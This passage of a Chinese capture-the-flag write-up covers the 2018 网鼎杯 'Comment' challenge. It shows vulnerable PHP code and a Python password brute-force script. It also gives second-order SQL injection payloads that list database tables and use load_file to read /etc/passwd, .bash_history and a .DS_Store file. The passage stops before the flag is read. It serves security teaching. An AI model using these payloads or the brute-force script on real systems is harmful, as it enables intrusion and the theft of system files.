board&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            set category = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$category&lt;/span&gt;&lt;/span&gt;&#39;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                title = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$title&lt;/span&gt;&lt;/span&gt;&#39;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                content = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt;&lt;/span&gt;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Location: ./index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;comment&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$bo_id&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;bo_id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select category from board where id=&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$bo_id&lt;/span&gt;&lt;/span&gt;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_num_rows&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$num&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$category&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_fetch_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;category&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;content&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;insert into comment&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            set category = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$category&lt;/span&gt;&lt;/span&gt;&#39;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                content = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt;&lt;/span&gt;&#39;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                bo_id = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$bo_id&lt;/span&gt;&lt;/span&gt;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Location: ./comment.php?id=&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$bo_id&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Location: ./index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Location: ./index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以存在明显的二次注入，从 &lt;code&gt;wrtie&lt;/code&gt;  功能写入，在 &lt;code&gt;comment&lt;/code&gt;  功能执行， &lt;code&gt;category&lt;/code&gt;  字段可以用来使用 payload，可以构造如下格式的 payload。&lt;/p&gt;
&lt;p&gt;先访问登录页面 &lt;code&gt;login.php&lt;/code&gt;  查看下。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意到其中账户密码的默认填充字符，需要注意此处就是出题人给出的提示，账户为 &lt;code&gt;zhangwei&lt;/code&gt;  密码为 &lt;code&gt;zhangwei***&lt;/code&gt; ，其中的 &lt;code&gt;***&lt;/code&gt;  为三位的未知字符串需要我们爆破。&lt;/p&gt;
&lt;p&gt;这里先 &lt;code&gt;***&lt;/code&gt;  测试为纯数字的情况。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests as res
import time
url=&amp;quot;http://2b661b6a-7be0-408c-84e4-0aa48b856bee.node4.buuoj.cn:81/login.php&amp;quot;
def change(num):
        return (&#39;0&#39;*(3-len(str(num))))+str(num)

for num in range(648,1000):
        resp=res.post(url=url,data=&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;zhangwei&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;zhangwei&amp;#123;&amp;#125;&amp;quot;.format(change(num))&amp;#125;)
        print(change(num)+&#39;=&amp;gt;&#39;+str(len(resp.text)))
        time.sleep(0.3)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 &lt;code&gt;***&lt;/code&gt;  的实际值为 &lt;code&gt;666&lt;/code&gt; ，用得到的账户和密码进行登录，接下来就可以进行二次登录了。&lt;/p&gt;
&lt;p&gt;先写入在写入功能写入 payload，如下 body 部分中参数 &lt;code&gt;category&lt;/code&gt;  中 &lt;code&gt;content=database()&lt;/code&gt;  部分的 &lt;code&gt;database()&lt;/code&gt;  可以替换为其他 SQL 查询语句或者函数，payload 其余部分则可视为固定。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着在评论功能触发二次注入，同样在此的 payload 也视为固定（注意项目的 SQL 语句为多行，所以需要 &lt;code&gt;#&lt;/code&gt; 和 &lt;code&gt;/**/&lt;/code&gt;  配合使用）。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后就能在对应的详情页面的留言部分查看到注入后的结果。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;按照惯例去依次查找下库、表、字段。&lt;/p&gt;
&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;schema_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;information_schema.schemata&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;information_schema.tables&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_schema&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;但查到字段时就发现，无论在那个表都找不到 flag 相关的字段，这里尝试读取下文件是否可行。&lt;/p&gt;
&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/etc/passwd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功了，并且可以发现 WEB 系统用户 home 目录竟然在 &lt;code&gt;/home&lt;/code&gt;  下，尝试去读取下其操作记录。&lt;/p&gt;
&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/home/www/.bash_history&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到当前项由 &lt;code&gt;html.zip&lt;/code&gt;  在原本 &lt;code&gt;/tmp&lt;/code&gt;  目录下解压再复制到 &lt;code&gt;/var/www&lt;/code&gt; ，并且记录了关于项目 &lt;code&gt;html&lt;/code&gt;  文件结构的 &lt;code&gt;.DS_Store&lt;/code&gt;  在 &lt;code&gt;/tmp&lt;/code&gt;  目录中仍存在一份，去读取这个文件了解下项目结构。&lt;/p&gt;
&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/html/.DS_Store&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;可能由于乱码问题所以无法完全读取，这里采用对其转成 16 进制。&lt;/p&gt;
&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/html/.DS_Store&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以将得到的 16 进制写入文件再用相关的.DS_Store 文件解析器去解析，但是此处都没显示完全（可以看到 16 进制末尾是一串…），所以直接转换成 ASCII 字符来查看也是可行的。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以识别出上图红框中文件与 flag 相关，去去读下，为了保险起见先尝试 hex 处理后的内容。&lt;/p&gt;
